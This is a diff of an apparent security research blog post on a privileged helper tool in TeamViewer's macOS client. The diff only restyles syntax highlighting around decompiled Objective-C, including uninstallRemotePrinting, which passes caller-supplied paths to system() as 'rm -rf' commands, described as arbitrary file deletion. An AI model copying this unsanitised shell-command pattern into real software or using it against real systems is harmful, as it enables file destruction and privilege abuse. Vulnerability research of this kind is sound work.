@@ -60,7 +60,7 @@ The TeamViewer macOS client used a PrivilegedHelperTool named com.teamviewer.Hel
 
   
   
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -242,112 +242,112 @@ Ian Beer from Google Project zero also talked about these:
   </a>
 </h2>
 <p>If we decompile the EntryPoint of the helper tool we can spot that it uses this interface.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">EntryPoint</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3) {
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> sub_10000612d();
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> [rax <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#f92672">=</span> rax;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>            r15 <span style="color:#f92672">=</span> [[NSConnection connectionWithReceivePort:r13 sendPort:<span style="color:#ae81ff">0x0</span>] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#f92672">=</span> [BlessedHelperDistantObject alloc];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#f92672">=</span> [rax init];
-</span></span><span style="display:flex;"><span>            r12 <span style="color:#f92672">=</span> rax;
-</span></span><span style="display:flex;"><span>            [r15 setRootObject:rax];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#f92672">=</span> [NSRunLoop currentRunLoop];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#f92672">=</span> [rax <span style="color:#66d9ef">retain</span>];
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">EntryPoint</span>(<span style="color:#078;font-weight:bold">int</span> arg0, <span style="color:#078;font-weight:bold">int</span> arg1, <span style="color:#078;font-weight:bold">int</span> arg2, <span style="color:#078;font-weight:bold">int</span> arg3) {
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> sub_10000612d();
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>            r15 <span style="color:#555">=</span> [[NSConnection <span style="color:#99f">connectionWithReceivePort</span>:r13 <span style="color:#99f">sendPort</span>:<span style="color:#f60">0x0</span>] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [BlessedHelperDistantObject alloc];
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rax init];
+</span></span><span style="display:flex;"><span>            r12 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>            [r15 <span style="color:#99f">setRootObject</span>:rax];
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [NSRunLoop currentRunLoop];
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
 </span></span><span style="display:flex;"><span>            [rax run];
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
-</span></span><span style="display:flex;"><span>            [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>            [r12 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>            [r15 <span style="color:#66d9ef">release</span>];
+</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>            [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>            [r12 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>            [r15 <span style="color:#069;font-weight:bold">release</span>];
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    [r13 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> rbx;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rax;
+</span></span><span style="display:flex;"><span>    [r13 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> rbx;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_10000612d</span>() {
-</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> launch_data_new_string(<span style="color:#e6db74">&#34;CheckIn&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>            r15 <span style="color:#f92672">=</span> rax;
-</span></span><span style="display:flex;"><span>            rax <span style="color:#f92672">=</span> launch_msg(rax);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                    r14 <span style="color:#f92672">=</span> rax;
-</span></span><span style="display:flex;"><span>                    rax <span style="color:#f92672">=</span> launch_data_dict_lookup(rax, <span style="color:#e6db74">&#34;Label&#34;</span>);
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                            r12 <span style="color:#f92672">=</span> launch_data_get_string(rax);
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">sub_10000612d</span>() {
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> launch_data_new_string(<span style="color:#c30">&#34;CheckIn&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>            r15 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> launch_msg(rax);
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                    r14 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> launch_data_dict_lookup(rax, <span style="color:#c30">&#34;Label&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                            r12 <span style="color:#555">=</span> launch_data_get_string(rax);
 </span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                            r12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>                            r12 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    rax <span style="color:#f92672">=</span> launch_data_dict_lookup(r14, <span style="color:#e6db74">&#34;MachServices&#34;</span>);
-</span></span><span style="display:flex;"><span>                    rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (r12 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
-</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                    rax <span style="color:#f92672">=</span> launch_data_dict_lookup(rax, r12);
-</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                            rax <span style="color:#f92672">=</span> launch_data_get_machport(rax);
-</span></span><span style="display:flex;"><span>                                            <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#f92672">=</span> [[NSMachPort alloc] initWithMachPort:rax];
+</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> launch_data_dict_lookup(r14, <span style="color:#c30">&#34;MachServices&#34;</span>);
+</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">if</span> (r12 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>                            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                                    rax <span style="color:#555">=</span> launch_data_dict_lookup(rax, r12);
+</span></span><span style="display:flex;"><span>                                    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                                            rax <span style="color:#555">=</span> launch_data_get_machport(rax);
+</span></span><span style="display:flex;"><span>                                            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#555">=</span> [[NSMachPort alloc] <span style="color:#99f">initWithMachPort</span>:rax];
 </span></span><span style="display:flex;"><span>                                            }
-</span></span><span style="display:flex;"><span>                                            <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>                                            <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>                                            }
 </span></span><span style="display:flex;"><span>                                    }
-</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                                            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>                                    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>                                            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>                                    }
 </span></span><span style="display:flex;"><span>                            }
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    launch_data_free(r14);
 </span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            launch_data_free(r15);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    [rbx autorelease];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p><code>NSConnection</code> is a clear indication, but the <code>launch_data_*</code> also a good hint towards this.</p>
 <p>Based on the name, we can make an educated guess that the class responsible for the connection is <code>BlessedHelperDistantObject</code>. If we do a class-dump on the help tool, we can get the class interface.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#66d9ef">@interface</span> <span style="color:#a6e22e">BlessedHelperDistantObject</span> : <span style="color:#a6e22e">NSObject</span> <span style="color:#f92672">&lt;</span>BlessedHelperProxy<span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">BlessedHelperDistantObject</span> : <span style="color:#0a8;font-weight:bold">NSObject</span> <span style="color:#555">&lt;</span>BlessedHelperProxy<span style="color:#555">&gt;</span>
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> AuthorizationOpaqueRef <span style="color:#f92672">*</span>_authorization;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">struct</span> AuthorizationOpaqueRef <span style="color:#555">*</span>_authorization;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">nonatomic</span>) <span style="color:#66d9ef">struct</span> AuthorizationOpaqueRef <span style="color:#f92672">*</span>authorization; <span style="color:#75715e">// @synthesize authorization=_authorization;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">uninstallRemotePrinting:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">BOOL</span>)<span style="color:#a6e22e">installRemotePrinting:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">configureTestMaster:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">deleteAuthPlugin</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">BOOL</span>)<span style="color:#a6e22e">helperSignatureMatchesSignatureOfBundleAtURL:</span>(<span style="color:#66d9ef">id</span>)arg1 <span style="color:#a6e22e">helperName:</span>(<span style="color:#66d9ef">id</span>)arg2;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">struct</span> __SecRequirement <span style="color:#f92672">*</span>)<span style="color:#a6e22e">copyOwnRequirementForHelperName:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">uninstall:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">writeLaunchdPropertyLists:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">deleteTVinOverridesPlist:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">loadDaemon:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">BOOL</span>)<span style="color:#a6e22e">run:</span>(<span style="color:#66d9ef">id</span>)arg1;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">terminate</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">BOOL</span>)<span style="color:#a6e22e">runWithArguments:</span>(<span style="color:#66d9ef">id</span>)arg1 <span style="color:#a6e22e">helperName:</span>(<span style="color:#66d9ef">id</span>)arg2;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">BOOL</span>)<span style="color:#a6e22e">needsUpdate:</span>(<span style="color:#66d9ef">id</span>)arg1 <span style="color:#a6e22e">helperName:</span>(<span style="color:#66d9ef">id</span>)arg2;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">readonly</span>, <span style="color:#66d9ef">copy</span>, <span style="color:#66d9ef">nonatomic</span>) NSString <span style="color:#f92672">*</span>version;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">dealloc</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#66d9ef">id</span>)<span style="color:#a6e22e">init</span>;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">nonatomic</span>) <span style="color:#069;font-weight:bold">struct</span> AuthorizationOpaqueRef <span style="color:#555">*</span>authorization; <span style="color:#09f;font-style:italic">// @synthesize authorization=_authorization;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstallRemotePrinting:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">installRemotePrinting:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">configureTestMaster:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">deleteAuthPlugin</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">helperSignatureMatchesSignatureOfBundleAtURL:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#069;font-weight:bold">struct</span> __SecRequirement <span style="color:#555">*</span>)<span style="color:#c0f">copyOwnRequirementForHelperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstall:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">writeLaunchdPropertyLists:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">deleteTVinOverridesPlist:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">loadDaemon:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">run:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">terminate</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">runWithArguments:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">needsUpdate:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>, <span style="color:#069;font-weight:bold">nonatomic</span>) NSString <span style="color:#555">*</span>version;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">dealloc</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">id</span>)<span style="color:#c0f">init</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Remaining properties
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">readonly</span>, <span style="color:#66d9ef">copy</span>) NSString <span style="color:#f92672">*</span>debugDescription;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">readonly</span>, <span style="color:#66d9ef">copy</span>) NSString <span style="color:#f92672">*</span>description;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">readonly</span>) <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> hash;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@property</span>(<span style="color:#66d9ef">readonly</span>) <span style="color:#66d9ef">Class</span> superclass;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Remaining properties
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>) NSString <span style="color:#555">*</span>debugDescription;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>) NSString <span style="color:#555">*</span>description;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>) <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span> hash;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>) <span style="color:#078;font-weight:bold">Class</span> superclass;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">@end</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
 </span></span></code></pre></div><p>There are quite a few interesting methods, but we will focus on <code>installRemotePrinting</code> and <code>uninstallRemotePrinting</code>. Unfortunately we don&rsquo;t get an indication of the passed arguments from the class-dump.</p>
 <h2 id="uninstallremoteprinting---arbitrary-file-deletion">
   uninstallRemotePrinting - Arbitrary file deletion
@@ -357,33 +357,33 @@ Ian Beer from Google Project zero also talked about these:
   </a>
 </h2>
 <p>Let&rsquo;s inspect  <code>uninstallRemotePrinting</code> first.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#75715e">/* @class BlessedHelperDistantObject */</span>
-</span></span><span style="display:flex;"><span>-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">uninstallRemotePrinting:</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg2 {
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString stringWithFormat:<span style="color:#e6db74">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[[[arg2 stringArguments] <span style="color:#66d9ef">retain</span>] remotePrintingPPDPath] <span style="color:#66d9ef">retain</span>]] <span style="color:#66d9ef">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    r14 <span style="color:#f92672">=</span> [[rax remotePrintingFilterPath] <span style="color:#66d9ef">retain</span>];
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString stringWithFormat:<span style="color:#e6db74">@&#34;rm -rf &#39;%@&#39;&#34;</span>, r14] <span style="color:#66d9ef">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [r14 <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString stringWithFormat:<span style="color:#e6db74">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingPrinterIconPath] <span style="color:#66d9ef">retain</span>]] <span style="color:#66d9ef">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString stringWithFormat:<span style="color:#e6db74">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingDatabasePath] <span style="color:#66d9ef">retain</span>]] <span style="color:#66d9ef">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#66d9ef">release</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class BlessedHelperDistantObject */</span>
+</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstallRemotePrinting:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> {
+</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[[[arg2 stringArguments] <span style="color:#069;font-weight:bold">retain</span>] remotePrintingPPDPath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> [[rax remotePrintingFilterPath] <span style="color:#069;font-weight:bold">retain</span>];
